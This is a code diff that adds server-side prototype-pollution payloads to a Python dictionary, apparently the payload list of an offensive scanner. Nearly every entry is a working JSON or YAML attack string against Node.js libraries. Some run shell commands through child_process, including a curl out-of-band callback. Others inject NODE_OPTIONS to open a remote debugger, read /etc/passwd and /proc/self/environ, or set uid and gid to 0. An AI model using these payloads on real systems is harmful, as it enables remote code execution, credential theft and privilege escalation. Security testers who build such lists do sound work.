@@ -194,6 +194,34 @@ SERVER_SIDE_PP_PAYLOADS = {
         '{"__proto__": {"execPath": "curl", "argv0": "%OOB%"}}',
         '{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": {"TEST": "console.log(require(\'child_process\').execSync(\'curl %OOB%\'))"}}}', 
     ],
+
+    # Post-Nov 2024 Critical CVEs (HackerAI Feed)
+    'recent_cves_2024_2025': [
+        # CVE-2024-21529 (dset) - DoS/RCE via merge
+        '{"__proto__": {"dset_exploit": true}}', 
+        '{"__proto__": {"paths": ["/tmp/evil"]}}',
+        # CVE-2024-33883 (EJS <3.1.10) - Template var pollution
+        '{"__proto__": {"client": true, "escapeFunction": "JSON.stringify; process.mainModule.require(\'child_process\').execSync(\'id\')"}}',
+        # CVE-2025-64718 (js-yaml) - YAML __proto__ tamper
+        '!!js/hash:Object.prototype { polluted: true }', 
+        '__proto__: !!js/hash:Object.prototype { x: y }',
+        # CVE-2024-38999 (requirejs)
+        '{"__proto__": {"context": {"config": {"packages": [{"name": "pkg", "main": "/tmp/evil.js"}]}}}}',
+    ],
+
+    # Advanced Server-Side Gadgets
+    'advanced_ss_gadgets': [
+        # NODE_OPTIONS Injection
+        '{"__proto__": {"NODE_OPTIONS": "--inspect=0.0.0.0:1337"}}',
+        '{"__proto__": {"NODE_OPTIONS": "--require ./"}}',
+        # dotenv injection
+        '{"__proto__": {"dotenv": {"loadSync": {"envPath": "/etc/passwd"}}}}',
+        '{"__proto__": {"dotenv": {"config": {"path": "/proc/self/environ"}}}}',
+        # tar/zip tools escalation
+        '{"__proto__": {"uid": 0}}',
+        '{"__proto__": {"gid": 0}}',
+        '{"__proto__": {"preserveUid": true}}',
+    ],
 }
 
 # ============================================================================
